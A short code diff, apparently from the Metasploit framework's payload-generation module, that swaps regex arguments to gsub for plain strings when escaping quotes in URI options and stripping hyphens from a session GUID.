@@ -40,7 +40,7 @@ module Msf
       end
 
       def generate_uri_option(opts, opt)
-        opts[opt] ? "--#{opt} '#{opts[opt].gsub(/'/, "\\'")}' " : ''
+        opts[opt] ? "--#{opt} '#{opts[opt].gsub('\'', "\\'")}' " : ''
       end
 
       def generate_http_uri(opts)
@@ -101,7 +101,7 @@ module Msf
         opts[:uuid] = Base64.encode64(opts[:uuid].to_raw).strip
         guid = "\x00" * 16
         unless opts[:stageless] == true
-          guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
+          guid = [SecureRandom.uuid.gsub('-', '')].pack('H*')
         end
         opts[:session_guid] = Base64.encode64(guid).strip
 
